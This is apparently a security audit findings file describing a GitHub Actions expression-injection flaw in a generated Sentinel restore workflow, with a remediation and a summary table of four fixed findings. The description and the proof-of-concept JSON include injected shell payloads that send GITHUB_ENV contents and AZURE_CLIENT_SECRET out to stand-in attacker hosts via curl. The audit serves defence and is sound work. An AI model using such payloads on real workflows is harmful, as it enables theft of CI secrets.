# Security Findings

## [MEDIUM] FINDING-004: GitHub Actions Expression Injection via workflow_dispatch Inputs

| Field         | Value                                           |
|---------------|-------------------------------------------------|
| Severity      | MEDIUM                                          |
| CWE           | CWE-78: Improper Neutralization of Special Elements used in an OS Command |
| OWASP         | A03:2021 — Injection                            |
| File(s)       | configure_gh_workflow.sh, configure_gh_workflow.ps1 |
| Line(s)       | (generated workflow template — restore workflow `run:` blocks) |
| Introduced By | Initial implementation                          |

**Description**
The generated `sentinel-restore.yml` workflow uses `${{ github.event.inputs.restore_flags }}`, `${{ github.event.inputs.generate_new_id }}`, and `${{ github.event.inputs.logic_app_mode }}` directly inside `run:` shell blocks. GitHub Actions interpolates `${{ }}` expressions *before* the shell executes, so a malicious value in `restore_flags` (e.g., `'; curl attacker.com/exfil?t=$(cat $GITHUB_ENV); echo '`) would execute arbitrary commands. While `workflow_dispatch` requires repository write access to trigger, this still represents a command injection vector — especially in repositories with multiple collaborators.

**Proof of Concept**
An attacker with write access to the repository triggers the workflow via the GitHub API with:
```json
{
  "ref": "main",
  "inputs": {
    "restore_flags": "'; echo $AZURE_CLIENT_SECRET > /tmp/secret; curl https://attacker.example.com --data-binary @/tmp/secret; echo '"
  }
}
```
The `${{ github.event.inputs.restore_flags }}` expression is interpolated into the shell script, executing the injected commands before the validation step can check the value.

**Impact**
An attacker with repository write access could exfiltrate GitHub Environment secrets (`AZURE_CLIENT_SECRET`, etc.) or execute arbitrary code in the workflow runner context.

**Remediation**
Move all `${{ github.event.inputs.* }}` references from `run:` blocks into `env:` blocks. Environment variables are set by the runner before shell execution and are not subject to expression injection. Reference them via `$VARNAME` in shell commands instead.

---

## Summary

| ID          | Title                                                     | Severity | Status |
|-------------|-----------------------------------------------------------|----------|--------|
| FINDING-001 | Client Secret CLI Exposure Warning                        | MEDIUM   | FIXED  |
| FINDING-002 | Mask Sensitive Input in Configuration Scripts             | LOW      | FIXED  |
| FINDING-003 | Pin Dependency Version Upper Bounds                       | LOW      | FIXED  |
| FINDING-004 | GitHub Actions Expression Injection via workflow_dispatch | MEDIUM   | FIXED  |
